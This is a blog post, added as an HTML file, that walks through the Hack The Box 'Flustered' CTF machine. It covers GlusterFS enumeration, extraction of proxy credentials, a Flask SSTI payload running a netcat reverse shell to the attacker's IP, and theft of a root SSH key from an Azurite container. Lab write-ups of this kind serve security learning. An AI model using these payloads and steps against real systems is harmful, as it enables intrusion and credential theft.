@@ -1,0 +1,520 @@
+<!doctype html>
+
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+<title>Flustered - HTBxUNI 2021 Quals &#8211; Joe Butler</title>
+<meta name="description" content="Website">
+<meta name="keywords" content="CTF, Easy box, GlusterFS, Jenkins, Squid Proxy, SSTI, Azurite">
+
+<!-- MathJax -->
+<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flustered - HTBxUNI 2021 Quals">
+<meta property="og:description" content="Website">
+<meta property="og:url" content="/2021/11/28/flusteredHTB.html">
+<meta property="og:site_name" content="Joe Butler">
+
+
+
+
+
+<link rel="canonical" href="/2021/11/28/flusteredHTB.html">
+
+
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+
+
+    <br>
+    <center>
+        <span class="main-header-image">
+            <h1 style="font-weight:100; font-kerning:normal"><a href="/">Joe Butler</a></h1>
+        </span>
+    </center>
+
+    <!-- NAVIGATION -->
+    <br>
+    <center>
+    <nav class="header-nav">
+        <ul class="navigation-bar">
+            <li><a href="/">HOME</a></li>
+            <li><a href="/tags/">TAGS</a></li>
+            <li><a href="/about/">ABOUT</a></li>
+            <li><a href="/search/">SEARCH</a></li>
+        </ul>
+    </nav>
+</center>
+
+</head>
+
+<!-- BODY -->
+<body id="post-index">
+
+    <!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+    <script src="/assets/js/scrollToTop.js"></script>
+    <script>addBackToTop({
+      diameter: 32,
+      backgroundColor: 'rgb(51,51,51)',
+      textColor: '#fff'
+    })</script>
+  
+    <div id="main" role="main">
+        <article class="hentry">
+
+            <div class="featured-image">
+            </div>
+            <br />
+            <!-- MAIN -->
+            <h1 class="entry-title">
+                Flustered - HTBxUNI 2021 Quals
+            </h1>
+            <h3 class="entry-subtitle">
+                
+              
+            </h3>
+            
+            <hr>
+          
+            <!-- POST CONTENT -->
+            <div class="entry-content">
+                <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#summary">Summary</a></li>
+<li class="toc-entry toc-h1"><a href="#enumeration">Enumeration</a></li>
+<li class="toc-entry toc-h1"><a href="#glusterfs">Glusterfs</a></li>
+<li class="toc-entry toc-h1"><a href="#steampunk-erahtb---ssti-to-rce">steampunk-era.htb - SSTI to RCE</a></li>
+<li class="toc-entry toc-h1"><a href="#www-data-to-jennifer">www-data to jennifer</a></li>
+<li class="toc-entry toc-h1"><a href="#jennifer-to-root">Jennifer to Root</a></li>
+<li class="toc-entry toc-h1"><a href="#azurite">Azurite</a></li>
+<li class="toc-entry toc-h1"><a href="#keys-to-the-kingdom">Keys to the Kingdom</a></li>
+</ul><h1 id="summary">
+<a class="anchor" href="#summary" aria-hidden="true"><span class="octicon octicon-link"></span></a>Summary</h1>
+<p>Flustered was an easy machine from Hackthebox: Uni CTF Quals 2021. Starting by mounting a remote GlusterFS and extracting credentials within the volume. Using these credentials, Squid proxy can be acessed to access an internal web application that is vulnerable to SSTI. Once on the box, there is a Azurite docker container containing the root SSH key to get root access to the machine.</p>
+
+<h1 id="enumeration">
+<a class="anchor" href="#enumeration" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumeration</h1>
+<p>An initial nmap shows quite a few ports open.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sV -sC -T4 -p- 10.129.209.174
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)
+|   256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)
+|_  256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)
+80/tcp    open  http       nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: steampunk-era.htb - Coming Soon
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+3128/tcp  open  http-proxy Squid http proxy 4.6
+|_http-server-header: squid/4.6
+|_http-title: ERROR: The requested URL could not be retrieved
+24007/tcp open  rpcbind
+49152/tcp open  rpcbind
+49153/tcp open  rpcbind
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>There are some hostnames present from the nmap, <code class="language-plaintext highlighter-rouge">steampunk-era.htb</code> and <code class="language-plaintext highlighter-rouge">flustered.htb</code> given that <code class="language-plaintext highlighter-rouge">steampunk-era.htb</code> states <em>“coming soon”</em>, it’s possible that this will be of no use; however I will add it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file anyway.</p>
+
+<p>Going to the website hosted on port 80, it seems to just be a default page:</p>
+
+<p><img src="https://i.imgur.com/fY9tm5G.png" alt="default.png"></p>
+
+<p>and doesn’t have much to it:</p>
+
+<p><img src="https://i.imgur.com/DrJGsd8.png" alt="steampunk.png"></p>
+
+<p>Background scanning can be done whilst the other ports are looked at. <code class="language-plaintext highlighter-rouge">flustered.htb</code> also points to this page.</p>
+
+<p>Attempting to view pages or enumerate for other ports using Squid proxy does not work - this is likely because it requires credentials.</p>
+
+<h1 id="glusterfs">
+<a class="anchor" href="#glusterfs" aria-hidden="true"><span class="octicon octicon-link"></span></a>Glusterfs</h1>
+
+<p>When googling for the port <code class="language-plaintext highlighter-rouge">24007</code>, a <a href="https://access.redhat.com/documentation/en-us/red_hat_gluster_storage/3.3/html/container-native_storage_for_openshift_container_platform/crs_port_access">RedHat documentation</a> suggests that GlusterFS is running on the machine and the ports nmap identified as <code class="language-plaintext highlighter-rouge">rpcbind</code> are used by GlusterFS.</p>
+
+<p>To interact with it, GlusterFS client can be installed with <code class="language-plaintext highlighter-rouge">sudo apt install glusterfs-server</code>. We attempted installing just <code class="language-plaintext highlighter-rouge">glusterfs-client</code>, but had issues with connections failing without the server package. Listing the volumes on the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo gluster --remote-host=flustered.htb volume list
+vol1
+vol2
+</code></pre></div></div>
+
+<p>The details of the volumes can also be listed with <code class="language-plaintext highlighter-rouge">sudo gluster --remote-host=flustered.htb volume info</code> returning:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo gluster --remote-host=flustered.htb volume info    
+ 
+Volume Name: vol1
+Type: Distribute
+Volume ID: 0870acf0-d619-4cda-b273-4486062cff24
+Status: Started
+Snapshot Count: 0
+Number of Bricks: 1
+Transport-type: tcp
+Bricks:
+Brick1: flustered:/gluster/bricks/brick1/vol1
+Options Reconfigured:
+storage.fips-mode-rchecksum: on
+transport.address-family: inet
+nfs.disable: on
+auth.ssl-allow: flustered.htb,web01.htb
+client.ssl: off
+server.ssl: off
+ 
+Volume Name: vol2
+Type: Distribute
+Volume ID: 4e220cb2-9e33-4566-8181-d81ff0ac6980
+Status: Started
+Snapshot Count: 0
+Number of Bricks: 1
+Transport-type: tcp
+Bricks:
+Brick1: flustered:/gluster/bricks/brick1/vol2
+Options Reconfigured:
+features.read-only: enable
+auth.ssl-allow: off
+server.ssl: off
+client.ssl: off
+auth.allow: *
+storage.fips-mode-rchecksum: on
+transport.address-family: inet
+nfs.disable: on
+</code></pre></div></div>
+
+<p>As seen above, <code class="language-plaintext highlighter-rouge">vol1</code> has <code class="language-plaintext highlighter-rouge">auth.ssl-allow: flustered.htb,web01.htb</code> meaning that authentication from <code class="language-plaintext highlighter-rouge">flustered.htb</code> or <code class="language-plaintext highlighter-rouge">web01.htb</code> is required. Whereas <code class="language-plaintext highlighter-rouge">vol2</code> states: <code class="language-plaintext highlighter-rouge">auth.allow: *</code> meaning that <code class="language-plaintext highlighter-rouge">vol2</code> is exposed with no restrictions.</p>
+
+<p>This volume can be mounted as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir vol2
+$ sudo mount -t glusterfs flustered.htb:/vol2 ./vol2
+$ sudo ls ./vol2
+aria_log.00000001  debian-10.3.flag  ibdata1	  ib_logfile1  multi-master.info  mysql_upgrade_info  squid
+aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performance_schema  tc.log
+</code></pre></div></div>
+
+<p>This appears to be a <code class="language-plaintext highlighter-rouge">mysql</code> directory. This can be copied into <code class="language-plaintext highlighter-rouge">/var/lib</code> and used like it was my database. Doing so:</p>
+
+<p><img src="https://i.imgur.com/dnY5pBt.png" alt="initialdatabase.png"></p>
+
+<p><img src="https://i.imgur.com/zsSFzL3.png" alt="password.png"></p>
+
+<p>Evidently, these credentials might work for the squid proxy identified previously. Proxying my browser through the squid proxy with these credentials gives the default nginx page:</p>
+
+<p><img src="https://i.imgur.com/anfOvU6.png" alt="defnginx.png"></p>
+
+<p>I configured proxychains with the following configuration inside <code class="language-plaintext highlighter-rouge">/etc/proxychains4.conf</code>:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">strict_chain</span>
+
+<span class="pi">[</span><span class="nv">ProxyList</span><span class="pi">]</span>
+<span class="s">http 10.129.96.25 3128 lance.friedman o&gt;WJ5-jD&lt;5^m3</span>
+</code></pre></div></div>
+
+<h1 id="steampunk-erahtb---ssti-to-rce">
+<a class="anchor" href="#steampunk-erahtb---ssti-to-rce" aria-hidden="true"><span class="octicon octicon-link"></span></a>steampunk-era.htb - SSTI to RCE</h1>
+<p>I can route automated fuzzing tools through squid proxy to enumerate the web application. This can take a while but amoung the results are:</p>
+
+<p><img src="https://i.imgur.com/NCQK09j.png" alt="webscan.png"></p>
+
+<p><code class="language-plaintext highlighter-rouge">app.py</code> details:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">request</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getsiteurl</span><span class="p">(</span><span class="n">config</span><span class="p">):</span>
+  <span class="k">if</span> <span class="n">config</span> <span class="ow">and</span> <span class="s">"siteurl"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s">"siteurl"</span><span class="p">]</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s">"steampunk-era.htb"</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index_page</span><span class="p">():</span>
+  <span class="c1"># Will replace this with a proper file when the site is ready
+</span>  <span class="n">config</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span>
+
+  <span class="n">template</span> <span class="o">=</span> <span class="s">f'''
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;title&gt;</span><span class="si">{</span><span class="n">getsiteurl</span><span class="p">(</span><span class="n">config</span><span class="p">)</span><span class="si">}</span><span class="s"> - Coming Soon&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body style="background-image: url('</span><span class="si">{</span><span class="n">url_for</span><span class="p">(</span><span class="s">'static'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s">'steampunk-3006650_1280.webp'</span><span class="p">)</span><span class="si">}</span><span class="s">');background-size: 100%;background-repeat: no-repeat;"&gt; 
+    &lt;/body&gt;
+    &lt;/html&gt;
+  '''</span>
+  <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>As seen, this is the configuration of the previously seen website. If there is no <code class="language-plaintext highlighter-rouge">config</code> specified in the client post request, <code class="language-plaintext highlighter-rouge">steampunk-era.htb</code> will be used (as seen before). Also, the picture will be set as an asset from the static subdirectory.</p>
+
+<p>Since this accepts user input and is being rendered with render_template_string, the code is vulnerable to <a href="https://portswigger.net/web-security/server-side-template-injection">SSTI</a>. If a request is sent with payload in the json, it should be executed in the template.</p>
+
+<p>The general idea can be seen with the existing <code class="language-plaintext highlighter-rouge">config.json</code>:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sitename"</span><span class="p">:</span><span class="w"> </span><span class="s2">"steampunk-era.htb"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>So the sitename is shown in the coming soon title. To test this, I can run the code on my own machine and debug. If the payload is:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"sitename"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anything"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"siteurl"</span><span class="p">:</span><span class="s2">"</span><span class="se">\{\{</span><span class="s2">7*7</span><span class="se">\}\}</span><span class="s2">"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Assuming the rest of the http request is correct (likely have to change content-type to <code class="language-plaintext highlighter-rouge">application/json</code>), this returns:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>49 - Coming Soon<span class="nt">&lt;/title&gt;</span>
+</code></pre></div></div>
+
+<p>So the SSTI works. Using a reverse shell payload (I initially used <code class="language-plaintext highlighter-rouge">/bin/bash</code> but had errors which <code class="language-plaintext highlighter-rouge">sh</code> seemed to solve):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="p">{</span>\<span class="p">{</span> <span class="n">request</span><span class="p">[</span><span class="s">'application'</span><span class="p">][</span><span class="s">'__globals__'</span><span class="p">][</span><span class="s">'__builtins__'</span><span class="p">][</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)[</span><span class="s">'popen'</span><span class="p">](</span><span class="s">'nc 10.10.14.2 9919 -e /bin/sh'</span><span class="p">)[</span><span class="s">'read'</span><span class="p">]()</span> \<span class="p">}</span>\<span class="p">}</span>
+</code></pre></div></div>
+
+<h1 id="www-data-to-jennifer">
+<a class="anchor" href="#www-data-to-jennifer" aria-hidden="true"><span class="octicon octicon-link"></span></a>www-data to jennifer</h1>
+<p>I can get a shell as <code class="language-plaintext highlighter-rouge">www-data</code>. After lots more enumeration, and remembering the previous <code class="language-plaintext highlighter-rouge">volume info</code> of glusterfs, it’s apparent that keys in <code class="language-plaintext highlighter-rouge">/etc/ssl</code> can be listed:</p>
+
+<p><img src="https://i.imgur.com/1xgbAZG.png" alt="keys.png"></p>
+
+<p>After downloading these and putting them in my <code class="language-plaintext highlighter-rouge">/etc/ssl</code> directory, I should be able to mount the first glusterfs volume by doing <code class="language-plaintext highlighter-rouge">sudo mount -t glusterfs flustered:/vol1 ./vol1</code>.</p>
+
+<p>Once the directory is mounted, we get access to <code class="language-plaintext highlighter-rouge">jennifer</code>’s home directory. From there, we can insert our own SSH public key into her <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. Once we’ve done this, we can SSH into the machine as <code class="language-plaintext highlighter-rouge">jennifer</code>.</p>
+
+<p>(Note: As we were experiencing issues with being able to mount the directory due to the certificate expiring, we had to login with root’s SSH key and do <code class="language-plaintext highlighter-rouge">su jennifer</code>. We also couldn’t access /home/jennifer due to: <code class="language-plaintext highlighter-rouge">cd: /home/jennifer: Too many levels of symbolic links</code>, so we’re working from the <code class="language-plaintext highlighter-rouge">/gluster/bricks/brick1/vol1/jennifer/</code> directory.)</p>
+
+<p>Once we’ve SSH’d, we can get the user flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ cat user.txt
+HTB{m0v1Ng_tHr0ugH_v0lUm3s_l1K3_a_jInj4}
+</code></pre></div></div>
+
+<h1 id="jennifer-to-root">
+<a class="anchor" href="#jennifer-to-root" aria-hidden="true"><span class="octicon octicon-link"></span></a>Jennifer to Root</h1>
+<p>A quick view of <code class="language-plaintext highlighter-rouge">ip a</code> tells us that Docker is running on this machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:a9:09:2e:03 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:a9ff:fe09:2e03/64 scope link 
+       valid_lft forever preferred_lft forever
+</code></pre></div></div>
+
+<p>We can also see that inside <code class="language-plaintext highlighter-rouge">/var/backups</code>, there is a key accessible by <code class="language-plaintext highlighter-rouge">jennifer</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ ls -lah /var/backups/key
+-rw-r----- 2 root jennifer 89 Oct 26 12:12 /var/backups/key
+</code></pre></div></div>
+
+<p>We can upload a static <code class="language-plaintext highlighter-rouge">nmap</code> and enumerate the Docker network.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./nmap 172.17.0.0/28
+
+Nmap scan report for 172.17.0.2
+Host is up (0.00020s latency).
+Not shown: 1206 closed ports
+PORT      STATE SERVICE
+10000/tcp open  webmin
+</code></pre></div></div>
+
+<p>This reveals a single container which has port 10000 open. If we attempt to netcat to it, we get a warning about 400 Bad Request, indicating this is a HTTP server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jennifer@flustered:/gluster/bricks/brick1/vol1/jennifer$ nc 172.17.0.2 10000
+test
+HTTP/1.1 400 Bad Request
+Connection: close
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -v http://172.17.0.2:10000/
+* Expire in 0 ms for 6 (transfer 0x5644c0df3fb0)
+*   Trying 172.17.0.2...
+* TCP_NODELAY set
+* Expire in 200 ms for 4 (transfer 0x5644c0df3fb0)
+* Connected to 172.17.0.2 (172.17.0.2) port 10000 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: 172.17.0.2:10000
+&gt; User-Agent: curl/7.64.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 400 Value for one of the query parameters specified in the request URI is invalid.
+&lt; Server: Azurite-Blob/3.14.3
+&lt; x-ms-error-code: InvalidQueryParameterValue
+&lt; x-ms-request-id: f4507e0b-43ed-4cc5-b273-816593bc6a92
+&lt; content-type: application/xml
+&lt; Date: Thu, 25 Nov 2021 14:38:28 GMT
+&lt; Connection: keep-alive
+&lt; Keep-Alive: timeout=5
+&lt; Transfer-Encoding: chunked
+&lt; 
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+&lt;Error&gt;
+  &lt;Code&gt;InvalidQueryParameterValue&lt;/Code&gt;
+  &lt;Message&gt;Value for one of the query parameters specified in the request URI is invalid.
+RequestId:f4507e0b-43ed-4cc5-b273-816593bc6a92
+Time:2021-11-25T14:38:28.694Z&lt;/Message&gt;
+* Connection #0 to host 172.17.0.2 left intact
+&lt;/Error&gt;
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Server</code> header reveals that this is a self-hosted Azurite emulator, used for local Azure Storage development. We can port forward port 10000 to our local machine using SSH:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh jennifer@flustered.htb -L 10000:172.17.0.2:10000</code></p>
+
+<h1 id="azurite">
+<a class="anchor" href="#azurite" aria-hidden="true"><span class="octicon octicon-link"></span></a>Azurite</h1>
+<p>We can now access this service from our own machine. We can use the following script to enumerate the service and download files (requires <code class="language-plaintext highlighter-rouge">pip install azure-blob-storage</code>). The connection string is from the <a href="https://github.com/Azure/Azurite#default-storage-account">Azurite GitHub</a> and specifies the AccountKey found in <code class="language-plaintext highlighter-rouge">/var/backups/key</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">azure.storage.blob</span> <span class="kn">import</span> <span class="n">BlobServiceClient</span><span class="p">,</span> <span class="n">BlobClient</span><span class="p">,</span> <span class="n">ContainerClient</span><span class="p">,</span> <span class="n">__version__</span>
+
+<span class="n">connect_str</span> <span class="o">=</span> <span class="s">'DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://127.0.0.1:10000/jennifer;QueueEndpoint=http://127.0.0.1:10001/jennifer;TableEndpoint=http://127.0.0.1:10002/jennifer;'</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">blob_service_client</span> <span class="o">=</span> <span class="n">BlobServiceClient</span><span class="p">.</span><span class="n">from_connection_string</span><span class="p">(</span><span class="n">connect_str</span><span class="p">)</span>
+
+    <span class="c1"># Listing containers and files in them
+</span>    <span class="k">for</span> <span class="n">container</span> <span class="ow">in</span> <span class="n">blob_service_client</span><span class="p">.</span><span class="n">list_containers</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">container</span><span class="p">[</span><span class="s">'name'</span><span class="p">])</span>
+        <span class="n">container_client</span> <span class="o">=</span> <span class="n">blob_service_client</span><span class="p">.</span><span class="n">get_container_client</span><span class="p">(</span><span class="n">container</span><span class="p">[</span><span class="s">'name'</span><span class="p">])</span>
+        <span class="n">blob_list</span> <span class="o">=</span> <span class="n">container_client</span><span class="p">.</span><span class="n">list_blobs</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">blob</span> <span class="ow">in</span> <span class="n">blob_list</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">blob</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Exception:'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>This tells us there is a container named <code class="language-plaintext highlighter-rouge">ssh-keys</code>, with a <code class="language-plaintext highlighter-rouge">root.key</code> in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>documents
+ssh-keys
+	jennifer.key
+	root.key
+</code></pre></div></div>
+
+<p>We can then download this with the following script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">azure.storage.blob</span> <span class="kn">import</span> <span class="n">BlobServiceClient</span><span class="p">,</span> <span class="n">BlobClient</span><span class="p">,</span> <span class="n">ContainerClient</span><span class="p">,</span> <span class="n">__version__</span>
+
+<span class="n">connect_str</span> <span class="o">=</span> <span class="s">'DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://127.0.0.1:10000/jennifer;QueueEndpoint=http://127.0.0.1:10001/jennifer;TableEndpoint=http://127.0.0.1:10002/jennifer;'</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">blob_service_client</span> <span class="o">=</span> <span class="n">BlobServiceClient</span><span class="p">.</span><span class="n">from_connection_string</span><span class="p">(</span><span class="n">connect_str</span><span class="p">)</span>
+
+    <span class="c1"># Download the root key blob
+</span>    <span class="n">blob_client</span> <span class="o">=</span> <span class="n">blob_service_client</span><span class="p">.</span><span class="n">get_blob_client</span><span class="p">(</span><span class="n">container</span><span class="o">=</span><span class="s">'ssh-keys'</span><span class="p">,</span> <span class="n">blob</span><span class="o">=</span><span class="s">'root.key'</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./root.key'</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">download_file</span><span class="p">:</span>
+        <span class="n">download_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">blob_client</span><span class="p">.</span><span class="n">download_blob</span><span class="p">().</span><span class="n">readall</span><span class="p">())</span>
+
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'Exception:'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Viewing the key confirms that it is an SSH key for root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ head root.key 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi
+NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q
+</code></pre></div></div>
+
+<h1 id="keys-to-the-kingdom">
+<a class="anchor" href="#keys-to-the-kingdom" aria-hidden="true"><span class="octicon octicon-link"></span></a>Keys to the Kingdom</h1>
+<p>Finally, we can login as root with SSH:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i root.key root@flustered.htb
+Linux flustered 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov 25 14:40:58 2021 from 10.10.14.156
+root@flustered:~# cat root.txt
+HTB{s3creTs_fr0m_th3_sT0r4g3_bl0b}
+root@flustered:~# 
+</code></pre></div></div>
+
+<p>We can get the root flag from root.txt: <code class="language-plaintext highlighter-rouge">HTB{s3creTs_fr0m_th3_sT0r4g3_bl0b}</code></p>
+
+            </div>
+
+            <!--- DIVIDING LINE -->
+            <hr />
+
+            <!-- POST TAGS -->
+            <div class="inline-tags">
+                <span>
+                    
+                        <a href="/tags/#CTF">#CTF&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Easy box">#Easy box&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#GlusterFS">#GlusterFS&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Jenkins">#Jenkins&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Squid Proxy">#Squid Proxy&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#SSTI">#SSTI&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Azurite">#Azurite&nbsp;&nbsp;&nbsp;</a>
+                    
+                </span>
+            </div>
+            <br />
+
+            <!-- POST DATE -->
+            <div class="post-date">
+                Nov 28, 2021 @ 12:54
+            </div>
+        </article>
+    </div>
+</body>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-wrapper">
+        <footer role="contentinfo">
+            <span>
+    &copy; 2021 Joe Butler.<br>Powered by <a target="_blank" href="https://jekyllrb.com" rel="nofollow noopener">Jekyll</a>
+</span>
+
+        </footer>
+    </div>
+</footer>
+</html>
